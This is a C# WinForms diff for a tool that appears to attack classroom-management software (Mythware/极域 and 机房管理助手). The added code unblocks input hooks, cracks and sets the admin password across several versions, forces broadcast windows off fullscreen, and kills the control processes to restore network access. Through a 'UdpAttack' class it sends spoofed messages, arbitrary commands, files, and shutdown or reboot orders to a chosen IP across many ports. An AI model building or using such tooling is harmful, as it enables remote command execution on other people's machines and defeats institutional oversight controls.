@@ -3,18 +3,36 @@ using System.Collections.Generic;
 using System.ComponentModel;
 using System.Data;
 using System.Drawing;
+using System.IO;
 using System.Linq;
 using System.Text;
+using System.Threading;
 using System.Threading.Tasks;
 using System.Windows.Forms;
+using T4CLLibrary.Mythware;
 
 namespace DemoGUI
 {
     public partial class Form1 : Form
     {
+        Thread _keyboardThread;
+        Thread _mouseThread;
+        Thread _windowingThread;
+        T4CLLibrary.Jfglzs.PasswordType passwordType = T4CLLibrary.Jfglzs.PasswordType.A;
         public Form1()
         {
             InitializeComponent();
+            
+
+            //解禁键盘鼠标
+            _keyboardThread = new Thread(OtherTools.EnableKeyboardByHook);
+            _keyboardThread.IsBackground = true;
+            _keyboardThread.Start();
+            _mouseThread = new Thread(OtherTools.EnableMouseByHook);
+            _mouseThread.IsBackground = true;
+            _mouseThread.Start();
+
+
         }
 
         private void ShowError(string message)
@@ -81,36 +99,65 @@ namespace DemoGUI
 
         private void buttonTmpPwd_Click(object sender, EventArgs e)
         {
-            var pwd = T4CLLibrary.Jfglzs.PasswordCracker.GenerateTemporaryPassword();
+            string pwd;
+            switch (passwordType)
+            {
+                case T4CLLibrary.Jfglzs.PasswordType.A:
+                    pwd = T4CLLibrary.Jfglzs.PasswordCracker.GenerateTemporaryPassword();
+                    break;
+                case T4CLLibrary.Jfglzs.PasswordType.B:
+                    pwd = T4CLLibrary.Jfglzs.PasswordCracker.GenerateTemporaryPassword();
+                    break;
+                case T4CLLibrary.Jfglzs.PasswordType.C:
+                    
+                    pwd = T4CLLibrary.Jfglzs.PasswordCracker.GenerateTemporaryPassword1001();
+                    break;
+                case T4CLLibrary.Jfglzs.PasswordType.D:
+                    pwd = T4CLLibrary.Jfglzs.PasswordCracker.GenerateTemporaryPassword1001();
+                    break;
+                default:
+                    ShowError("未知密码类型");
+                    return;
+            }
+
             ShowInfo($"生成的临时密码为：{pwd}, 已复制到剪切板");
             Clipboard.SetText(pwd);
         }
 
-        private void checkBoxNew_CheckedChanged(object sender, EventArgs e)
-        {
-            buttonGetJFPwd.Enabled = checkBoxNew.Checked;
-        }
+        
 
         private void buttonJFPwd_Click(object sender, EventArgs e)
         {
             try
             {
                 var pwd = textBoxPwd.Text;
+                string encryptedPwd;
                 if (string.IsNullOrEmpty(pwd))
                 {
                     ShowError("请输入密码");
                     return;
                 }
-                var isNew = checkBoxNew.Checked;
-                if (isNew)
+                switch (passwordType)
                 {
-                    var encryptedPwd = T4CLLibrary.Jfglzs.PasswordCracker.EncryptPasswordNew(pwd);
-                    T4CLLibrary.Jfglzs.PasswordCracker.SetEncryptedPassword(encryptedPwd);
-                }
-                else
-                {
-                    var encryptedPwd = T4CLLibrary.Jfglzs.PasswordCracker.EncryptPassword(pwd);
-                    T4CLLibrary.Jfglzs.PasswordCracker.SetEncryptedPassword(pwd);
+                    
+                    case T4CLLibrary.Jfglzs.PasswordType.A:
+                        encryptedPwd = T4CLLibrary.Jfglzs.PasswordCracker.EncryptPassword(pwd);
+                        T4CLLibrary.Jfglzs.PasswordCracker.SetEncryptedPassword(encryptedPwd);
+                        break;
+                    case T4CLLibrary.Jfglzs.PasswordType.B:
+                        encryptedPwd = T4CLLibrary.Jfglzs.PasswordCracker.EncryptPassword0999(pwd);
+                        T4CLLibrary.Jfglzs.PasswordCracker.SetEncryptedPassword(encryptedPwd);
+                        break;
+                    case T4CLLibrary.Jfglzs.PasswordType.C:
+                        encryptedPwd = T4CLLibrary.Jfglzs.PasswordCracker.EncryptPassword1001(pwd);
+                        T4CLLibrary.Jfglzs.PasswordCracker.SetEncryptedPassword(encryptedPwd, T4CLLibrary.Jfglzs.PasswordType.C);
+                        break;
+                    case T4CLLibrary.Jfglzs.PasswordType.D:
+                        encryptedPwd = T4CLLibrary.Jfglzs.PasswordCracker.EncryptPassword1002(pwd);
+                        T4CLLibrary.Jfglzs.PasswordCracker.SetEncryptedPassword(encryptedPwd,T4CLLibrary.Jfglzs.PasswordType.D);
+                        break;
+                    default:
+                        break;
                 }
                 ShowInfo("密码已设置");
             }
@@ -146,6 +193,11 @@ namespace DemoGUI
 
         private async void buttonGetJFPwd_Click(object sender, EventArgs e)
         {
+            if (passwordType != T4CLLibrary.Jfglzs.PasswordType.B)
+            {
+                ShowError("仅能在9.99版获取密码");
+                return;
+            }
             try
             {
                 labelJFPwdCrackState.Text = "正在获取密码...";
@@ -254,8 +306,12 @@ namespace DemoGUI
             try
             {
                 var msg = textBoxSendText.Text;
-                T4CLLibrary.Mythware.UdpAttack.SendMessage(msg, T4CLLibrary.Mythware.CommandType.SendMessage, textBoxIP.Text, int.Parse(textBoxPort.Text));
-                ShowInfo($"发送消息: {msg} 到 {textBoxIP.Text}:{textBoxPort.Text}");
+                var ports = textBoxPort.Text.Split(',');
+                foreach (var port in ports)
+                {
+                    T4CLLibrary.Mythware.UdpAttack.SendMessage(msg, T4CLLibrary.Mythware.CommandType.SendMessage, textBoxIP.Text, int.Parse(port));
+                }
+                ShowInfo($"发送消息: {msg} 到 {textBoxIP.Text}的{textBoxPort.Text}端口");
             }
             catch (Exception ex)
             {
@@ -268,8 +324,12 @@ namespace DemoGUI
             try
             {
                 var cmd = textBoxSendText.Text;
-                T4CLLibrary.Mythware.UdpAttack.SendMessage(cmd, T4CLLibrary.Mythware.CommandType.ExecuteCommand, textBoxIP.Text, int.Parse(textBoxPort.Text));
-                ShowInfo($"发送命令: {cmd} 到 {textBoxIP.Text}:{textBoxPort.Text}");
+                var ports = textBoxPort.Text.Split(',');
+                foreach (var port in ports)
+                {
+                    T4CLLibrary.Mythware.UdpAttack.SendMessage(cmd, T4CLLibrary.Mythware.CommandType.ExecuteCommand, textBoxIP.Text, int.Parse(port));
+                }
+                ShowInfo($"发送命令: {cmd} 到 {textBoxIP.Text}的{textBoxPort.Text}端口");
             }
             catch (Exception ex)
             {
@@ -281,7 +341,11 @@ namespace DemoGUI
         {
             try
             {
-                T4CLLibrary.Mythware.UdpAttack.SendMessage(null, T4CLLibrary.Mythware.CommandType.Shutdown, textBoxIP.Text, int.Parse(textBoxPort.Text));
+                var ports = textBoxPort.Text.Split(',');
+                foreach (var port in ports)
+                {
+                    T4CLLibrary.Mythware.UdpAttack.SendMessage(null, T4CLLibrary.Mythware.CommandType.Shutdown, textBoxIP.Text, int.Parse(port));
+                }
                 ShowInfo($"发送关机命令到 {textBoxIP.Text}:{textBoxPort.Text}");
             }
             catch (Exception ex)
@@ -294,7 +358,11 @@ namespace DemoGUI
         {
             try
             {
-                T4CLLibrary.Mythware.UdpAttack.SendMessage(null, T4CLLibrary.Mythware.CommandType.Reboot, textBoxIP.Text, int.Parse(textBoxPort.Text));
+                var ports = textBoxPort.Text.Split(',');
+                foreach (var port in ports)
+                {
+                    T4CLLibrary.Mythware.UdpAttack.SendMessage(null, T4CLLibrary.Mythware.CommandType.Reboot, textBoxIP.Text, int.Parse(port));
+                }
                 ShowInfo($"发送重启命令到 {textBoxIP.Text}:{textBoxPort.Text}");
             }
             catch (Exception ex)
@@ -313,12 +381,137 @@ namespace DemoGUI
                     ShowError("获取端口失败");
                     return;
                 }
-                var ports = string.Join(", ", result);
-                ShowInfo($"获取端口成功: {ports}");
+                var ports = string.Join(",", result);
+                ShowInfo($"获取端口成功: {ports}, 已复制到剪切板");
+                Clipboard.SetText(ports);
             }
             catch (Exception ex)
             {
                 ShowError($"获取端口失败: {ex.Message}");
+            }
+        }
+
+        private void buttonDbg_Click(object sender, EventArgs e)
+        {
+            //try
+            //{
+            //    var num = int.Parse(textBoxPwd.Text);
+            //    T4CLLibrary.Mythware.NetworkHelper.Test(num);
+            //    ShowInfo($"测试成功: {num}");
+            //}
+            //catch (Exception ex)
+            //{
+            //    ShowError(ex.Message);
+            //}
+            //Thread.Sleep(10000);
+
+
+
+            //try
+            //{
+            //    var tmpPwd1002 = T4CLLibrary.Jfglzs.PasswordCracker.GenerateTemporaryPassword1001();
+            //    ShowInfo($"生成的临时密码为：{tmpPwd1002}, 已复制到剪切板");
+            //    Clipboard.SetText(tmpPwd1002);
+            //}
+            //catch (Exception ex)
+            //{
+            //    ShowError(ex.Message);
+            //}
+
+            try
+            {
+                var openFileDialog = new OpenFileDialog();
+                if (openFileDialog.ShowDialog() == DialogResult.OK)
+                {
+                    var filePath = openFileDialog.FileName;
+                    var fileName = Path.GetFileName(filePath);
+                    var fileBytes = File.ReadAllBytes(filePath);
+                    T4CLLibrary.Mythware.UdpAttack.SendFile(fileName, fileBytes, textBoxIP.Text, int.Parse(textBoxPort.Text));
+                    ShowInfo($"发送文件: {fileName} 到 {textBoxIP.Text}:{textBoxPort.Text}");
+                }
+            }
+            catch (Exception ex)
+            {
+                ShowError($"发送文件失败: {ex.Message}");
+            }
+
+
+
+        }
+
+
+
+       
+
+        private void buttonDefullScreen_Click(object sender, EventArgs e)
+        {
+            buttonDefullScreen.Enabled = false;
+            
+            _windowingThread = new Thread(() =>
+            {
+                while (true)
+                {
+                    T4CLLibrary.Mythware.OtherTools.TrySetBroadcastWindowToNormal();
+                    Thread.Sleep(1000);
+                }
+            });
+            _windowingThread.IsBackground = true;
+            _windowingThread.Start();
+            ShowInfo("正在重复窗口化广播");
+        }
+
+        private void Form1_FormClosed(object sender, FormClosedEventArgs e)
+        {
+        }
+
+        //实际9.99版，懒得改名字了
+        private void radioButton09991002_CheckedChanged(object sender, EventArgs e)
+        {
+            passwordType = T4CLLibrary.Jfglzs.PasswordType.B;
+        }
+
+        private void radioBtnL0999_CheckedChanged(object sender, EventArgs e)
+        {
+            passwordType = T4CLLibrary.Jfglzs.PasswordType.A;
+        }
+
+        private void radioButtonG1002_CheckedChanged(object sender, EventArgs e)
+        {
+            passwordType = T4CLLibrary.Jfglzs.PasswordType.D;
+        }
+
+        private void radioBtn1001_CheckedChanged(object sender, EventArgs e)
+        {
+            passwordType = T4CLLibrary.Jfglzs.PasswordType.C;
+        }
+
+        private void buttonEnableNet_MouseClick(object sender, MouseEventArgs e)
+        {
+            if(e.Button == MouseButtons.Left)
+            {
+                try
+                {
+                    NetworkHelper.EnableNetwork();
+                    var result = MessageBox.Show("已成功，若还是无法访问网络，请单击“是”以暴力结束（会结束机房管理助手和极域进程）", "提示", MessageBoxButtons.YesNo, MessageBoxIcon.Information);
+                    if (result == DialogResult.Yes)
+                    {
+                        
+                        NetworkHelper.EnableNetworkForce();
+                        ShowInfo("成功");
+                    }
+                    else
+                    {
+                        ShowInfo("已取消");
+                    }
+                }
+                catch (Exception ex)
+                {
+                    ShowError(ex.Message);
+                }
+            }
+            else if (e.Button == MouseButtons.Right)
+            {
+                
             }
         }
     }
